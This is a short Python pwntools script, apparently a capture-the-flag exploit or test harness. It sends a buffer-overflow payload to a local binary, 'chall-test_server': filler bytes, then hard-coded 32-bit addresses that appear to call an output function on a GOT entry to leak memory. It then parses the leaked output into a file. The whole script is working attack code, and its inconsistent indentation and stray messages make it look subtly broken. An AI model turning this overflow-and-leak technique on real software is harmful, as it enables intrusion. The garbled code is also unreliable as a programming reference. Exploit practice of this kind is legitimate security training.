from pwn import *

import sys

target = process("./chall-test_server")
payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x80490f0)
payload += "0000"
payload += p32(0x804c018)
target.sendline(payload)
# Scan in all of the input
foundEnd = False
output = ""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True


print("output is: %s" % str(output))
# Break up the input by newline characters
outputLines = output.split("\n")
# Early termination if there is no output
if len(outputLines) == 2:
        print("can't deny")
        outputFile = open("justifies", "w")
	outputFile.write("")
	outputFile.close()
	sys.exit(0)

print("burn it all down")
# Parse out the filler output
fillerOutput = outputLines[:-2]
fillerOutput = "\\n".join(fillerOutput)
fillerOutput += "\\n"
# Write it to the output file
outputFile = open("justifies", "w")
outputFile.write(fillerOutput)
outputFile.close()

